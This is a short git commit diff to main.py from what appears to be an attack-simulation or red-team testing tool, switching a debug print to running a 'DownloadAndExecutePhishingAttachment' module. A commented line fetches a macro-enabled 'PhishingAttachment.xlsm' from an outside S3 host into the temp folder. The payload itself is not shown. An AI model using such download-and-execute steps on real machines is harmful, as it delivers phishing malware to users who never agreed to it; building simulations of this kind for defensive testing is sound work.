ac51564a3c20db670460a1a8f99e9df933b25051
opabravo <21262207+opabravo@users.noreply.github.com>
2023-03-09 17:36:12 +0800

    Test windows module dependency and execution

--- main.py
+++ main.py
@@ -6,4 +6,9 @@ if __name__ == '__main__':
     # print(file_exist("$env:temp\wsu8257.tmp"))
     # print(download("https://cym-rt-resources.s3-eu-west-1.amazonaws.com/PhishingAttachment.xlsm", "$env:temp\PhishingAttachment.xlsm")[1].decode('big5'))
     m = DownloadAndExecutePhishingAttachment()
-    print(repr(m.execution))
+    # print(repr(m.execution))
+    # print(m.execution.dependencies)
+
+    # Template Main
+    # print(m.check_dependency())
+    print(m.execute())
